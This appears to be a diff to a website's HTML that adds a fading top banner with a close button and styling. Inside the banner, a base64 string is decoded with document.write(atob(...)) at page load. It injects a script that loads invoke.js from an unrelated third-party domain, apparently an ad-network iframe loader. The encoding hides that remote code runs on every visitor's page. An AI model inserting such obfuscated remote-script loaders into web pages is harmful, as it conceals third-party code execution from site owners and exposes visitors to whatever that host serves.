@@ -232,6 +232,77 @@ e[p].split("="),C=void 0,x=z[0].replace(/\[\d*\]/,function(L){C=L.slice(1,-1);re
 
 ai_js_code = true;
 </script>
+	<!------------- banner topo ---------->
+<div class="banner">
+  <!-- Conteúdo do banner -->
+  <div class="bannerint">
+
+	  
+		
+		
+     
+	  
+	 <script>document.write(atob("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJYXRPcHRpb25zID0gewoJCSdrZXknIDogJ2E1NWI2N2I1NDljYmVmZWE1ODM1MmY5ODFkNWJjYzAyJywKCQknZm9ybWF0JyA6ICdpZnJhbWUnLAoJCSdoZWlnaHQnIDogNjAsCgkJJ3dpZHRoJyA6IDQ2OCwKCQkncGFyYW1zJyA6IHt9Cgl9Owo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLy9kdW1teW1lcmNoYW5kaXNlLmNvbS9hNTViNjdiNTQ5Y2JlZmVhNTgzNTJmOTgxZDViY2MwMi9pbnZva2UuanMiPjwvc2NyaXB0Pg=="));</script>
+	  
+	  
+
+
+	  
+	  
+  </div>
+  
+  <!-- Botão de fechar -->
+  <div class="close-btn">X</div>
+</div>
+
+<script>
+  // Função para exibir o banner após 3 segundos
+  setTimeout(function() {
+    document.querySelector('.banner').style.opacity = '1';
+  }, 3000);
+
+  // Função para fechar o banner quando o botão é clicado
+  document.querySelector('.close-btn').addEventListener('click', function() {
+    document.querySelector('.banner').style.display = 'none';
+  });
+</script>
+
+<style>
+  /* Estilo do banner */
+  .banner {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background-color: #f0f0f0;
+    border-bottom: 1px solid #ccc;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 20px;
+    box-sizing: border-box;
+    z-index: 9999; 
+    opacity: 0; /
+    transition: opacity 0.5s ease; 
+  }
+
+ 
+  .close-btn {
+    padding: 5px 7px;
+    background: #49014a;
+    border-radius: 5px;
+    color: #fff;
+    border: 2px solid #000;
+    cursor: pointer;
+  }
+  .imgbanner {
+    width: 100%;
+  }
+  .bannerint {
+    margin: auto;
+    padding: 5px;
+  }
+</style>
 </body>
 </html>
 
